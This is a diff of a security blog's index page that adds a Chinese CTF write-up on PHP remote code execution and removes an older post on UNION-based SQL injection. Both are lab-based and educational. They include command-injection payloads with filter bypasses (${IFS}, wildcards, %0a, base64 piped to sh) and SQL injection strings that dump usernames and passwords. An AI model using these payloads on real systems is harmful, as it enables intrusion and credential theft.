@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-count">46</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,292 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/10/web-security/rce/2026-08-10-rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/10/web-security/rce/2026-08-10-rce/" class="post-title-link" itemprop="url">RCE</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-10 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-10T22:00:00+08:00">2026-08-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-11 16:00:13" itemprop="dateModified" datetime="2026-08-11T16:00:13+08:00">2026-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/rce/" itemprop="url" rel="index"><span itemprop="name">rce</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + Apache + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: Pikachu DVWA CTFHub</p>
+</blockquote>
+<h1 id="1-0-RCE"><a href="#1-0-RCE" class="headerlink" title="1.0 RCE"></a>1.0 RCE</h1><h2 id="1-1-基础"><a href="#1-1-基础" class="headerlink" title="1.1 基础"></a>1.1 基础</h2><ul>
+<li><strong>定义:</strong> <strong>RCE(Remote Code Execution 远程代码执行)</strong> 是指攻击者能够在目标服务器上<strong>远程执行任意代码或系统命令</strong>的漏洞. 它是 Web 安全中危害等级最高的漏洞类型之一, 一旦利用成功, 攻击者可直接获取服务器权限(GetShell), 进而窃取数据, 植入后门, 横向渗透甚至控制整个内网</li>
+<li><strong>核心原理:</strong> 用户可控的数据, 未经充分过滤&#x2F;转义, 被拼接进了代码或命令的执行上下文中</li>
+</ul>
+<h2 id="1-2-相关函数"><a href="#1-2-相关函数" class="headerlink" title="1.2 相关函数"></a>1.2 相关函数</h2><ul>
+<li>命令command注入</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>system()</td>
+<td>执行外部程序并显示</td>
+</tr>
+<tr>
+<td>exec() <br>shell_exec()</td>
+<td>通过shell环境执行命令, 并将完整的输出以字符串方式返回</td>
+</tr>
+<tr>
+<td>pcntl_exec()</td>
+<td>在当前进程空间执行指定程序</td>
+</tr>
+<tr>
+<td>passthru()</td>
+<td>执行外部程序并显示原始输出</td>
+</tr>
+<tr>
+<td>popen()</td>
+<td>打开进程文件指针</td>
+</tr>
+<tr>
+<td>proc_open()</td>
+<td>执行一个命令, 并打开用来input&#x2F;output的文件指针</td>
+</tr>
+</tbody></table>
+<ul>
+<li>代码code注入</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eval()</td>
+<td>把字符串code作为php代码执行</td>
+</tr>
+<tr>
+<td>assert</td>
+<td>检查一个断言是否为false</td>
+</tr>
+<tr>
+<td>preg replace()</td>
+<td>执行一个正则表达式的搜索和替换</td>
+</tr>
+<tr>
+<td>create function()</td>
+<td>创建一个匿名函数并且返回函数名创</td>
+</tr>
+<tr>
+<td>call userfunc()<br>caIl_user func array()</td>
+<td>把第一个参数作为回调函数调用</td>
+</tr>
+<tr>
+<td>usort()<br>uasort()</td>
+<td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Windows命令拼接符号</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;&amp;</td>
+<td>左边执行成功, 才执行右边</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>拼接</td>
+</tr>
+<tr>
+<td>|</td>
+<td>管道符(前一条输出当后一条输入)</td>
+</tr>
+<tr>
+<td>||</td>
+<td>左边执行失败, 才执行右边</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>URL 编码的换行, 也能分隔命令</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Linux命令拼接符号</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>;</td>
+<td>连接符</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>左边执行成功, 才执行右边</td>
+</tr>
+<tr>
+<td>|</td>
+<td>管道(前一条输出当后一条输入)</td>
+</tr>
+<tr>
+<td>||</td>
+<td>左边执行失败, 才执行右边</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>任务后台执行, 类似nohup</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>URL 编码的换行, 也能分隔命令</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="1-3-过滤绕过"><a href="#1-3-过滤绕过" class="headerlink" title="1.3 过滤绕过"></a>1.3 过滤绕过</h2><ul>
+<li><p><code>空格</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag  <span class="comment"># $&#123;IFS&#125; 是内部字段分隔符(默认含空格/Tab/换行)</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,/flag&#125;     <span class="comment"># 花括号扩展，逗号代替空格</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>cat</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t /flag             <span class="comment"># 空字符串拼接, ca&#x27;&#x27;t 还是 cat</span></span><br><span class="line">ca\t /flag              <span class="comment"># 反斜杠转义</span></span><br><span class="line">c?a? /f???              <span class="comment"># ? 匹配单字符, * 匹配任意 → c?t /f*</span></span><br><span class="line">more/less/head/tail/nl</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>flag</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /f*                 <span class="comment"># * 通配</span></span><br><span class="line"><span class="built_in">cat</span> /fla?               <span class="comment"># ? 通配</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>; | &amp;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acat /flag   <span class="comment"># URL [换行]编码换行符 %0a 代替 ;</span></span><br><span class="line">127.0.0.1%0dcat /flag   <span class="comment"># %0d [回车]</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Base64编码</p>
+</li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;cat flag&quot;</span> | <span class="built_in">base64</span>  <span class="comment"># -n必须加否则会自带 \n换行, 实际解码内容溢出</span></span><br><span class="line"><span class="comment"># 此时输出一个编码  </span></span><br><span class="line"><span class="built_in">echo</span> 编码 | <span class="built_in">base64</span> -d | sh    <span class="comment"># 解码并执行 </span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="2-0-实战"><a href="#2-0-实战" class="headerlink" title="2.0 实战"></a>2.0 实战</h2><blockquote>
+<p>CTFHub-RCE(综合过滤)</p>
+</blockquote>
+<ul>
+<li>源码分析</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>后端做校验对”\|&amp;;&#x2F; cat flag ctfhub”等关键字都做了过滤</li>
+<li>这里使用等价替换的方式进行绕过</li>
+</ul>
+<p><strong>01 探测当前目录结构</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/1.png"></p>
+<blockquote>
+<p>回显目标目录flag_is_here</p>
+</blockquote>
+<p><strong>02 查看目标目录结构</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als<span class="variable">$&#123;IFS&#125;</span>f*_is_here</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/2.png"></p>
+<blockquote>
+<p>该文件存放通关代码, 想办法读取</p>
+</blockquote>
+<p><strong>03 获取文件内容</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd<span class="variable">$&#123;IFS&#125;</span>f*_is_here%0aless<span class="variable">$&#123;IFS&#125;</span>f*_10040951432284.php</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/10/web-security/rce/2026-08-10-rce/3.png"></p>
+<blockquote>
+<p>打开网页源代码即可获取到通关代码, 输入即可通关本关</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2963,197 +3249,9 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/private/icon1.png">
-      <meta itemprop="name" content="Byron">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Byron">
-      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Byron">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/" class="post-title-link" itemprop="url">Union Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-07-06 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-06T22:00:00+08:00">2026-07-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-07 20:29:10" itemprop="dateModified" datetime="2026-07-07T20:29:10+08:00">2026-07-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-2</p>
-</blockquote>
-<h2 id="1-0-前置基础"><a href="#1-0-前置基础" class="headerlink" title="1.0 前置基础"></a>1.0 前置基础</h2><h3 id="1-1-Web应用三层架构"><a href="#1-1-Web应用三层架构" class="headerlink" title="1.1 Web应用三层架构:"></a>1.1 Web应用三层架构:</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png"></p>
-<blockquote>
-<p>SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行</p>
-</blockquote>
-<hr>
-<h3 id="1-2-order-by-探测-排序"><a href="#1-2-order-by-探测-排序" class="headerlink" title="1.2 order by (探测&#x2F;排序)"></a>1.2 order by (探测&#x2F;排序)</h3><p><strong>01 语法格式:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 作用:</strong></p>
-<ul>
-<li>用于探测指定表的列数</li>
-</ul>
-<hr>
-<h3 id="1-3-union-联合查询"><a href="#1-3-union-联合查询" class="headerlink" title="1.3 union (联合查询)"></a>1.3 union (联合查询)</h3><p><strong>01 联合查询语法:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 特性:</strong></p>
-<ul>
-<li>列数必须完全相等：前后两条SELECT查询的字段数量必须一致</li>
-<li>数据类型必须兼容</li>
-</ul>
-<hr>
-<h3 id="1-4-系统库-information-schema"><a href="#1-4-系统库-information-schema" class="headerlink" title="1.4 系统库 information_schema"></a>1.4 系统库 information_schema</h3><p><strong>01 概述:</strong></p>
-<p> <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace"><strong>information_schema</strong></span> 是MySQL 5.0 及以上版本自带的“元数据库”,正是该库的特性,才提供了后续注入的核心内容!</p>
-<p><strong>02 结构图解:</strong></p>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/information_schema.png"></p>
-<p><strong>03 字段解读:</strong></p>
-<ul>
-<li>schemata: 存储所有数据库的信息<ul>
-<li>schema_name(数据库名)</li>
-</ul>
-</li>
-<li>tables<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(数据表名)</li>
-</ul>
-</li>
-<li>columns<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(所属表名)</li>
-<li>column_name(字段名)</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="2-0-手工注入"><a href="#2-0-手工注入" class="headerlink" title="2.0 手工注入"></a>2.0 手工注入</h2><h3 id="2-1-注入流程"><a href="#2-1-注入流程" class="headerlink" title="2.1 注入流程"></a>2.1 注入流程</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/process.png"></p>
-<h3 id="2-2-注入案例"><a href="#2-2-注入案例" class="headerlink" title="2.2 注入案例"></a>2.2 注入案例</h3><table>
-<thead>
-<tr>
-<th>靶场</th>
-<th>关卡</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>sqli-labs</td>
-<td>Less-2</td>
-</tr>
-</tbody></table>
-<p><strong>01 判断有无注入点</strong></p>
-<ul>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</p>
-</li>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;2</span> → 无返回值</p>
-</li>
-</ul>
-<blockquote>
-<p>通过以上Payload判断存在注入点,且为<strong>数字型</strong></p>
-</blockquote>
-<p><strong>02 猜解列数</strong></p>
-<ul>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 1</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 2</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 3</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 4</span> → 报错 <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">Unknown column ‘4’ in ‘order clause’</span></li>
-</ul>
-<blockquote>
-<p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
-</blockquote>
-<p><strong>03 定位回显</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/huixian.png"></p>
-<blockquote>
-<p>通过上图得知可用回显位为2,3</p>
-</blockquote>
-<p><strong>04 爆数据库名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/database.png"></p>
-<p><strong>05 爆所有表</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/tables.png"></p>
-<p><strong>06 爆字段</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/columns.png"></p>
-<p><strong>07 爆数据</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password),<span class="keyword">null</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
 
 </div>
   </main>
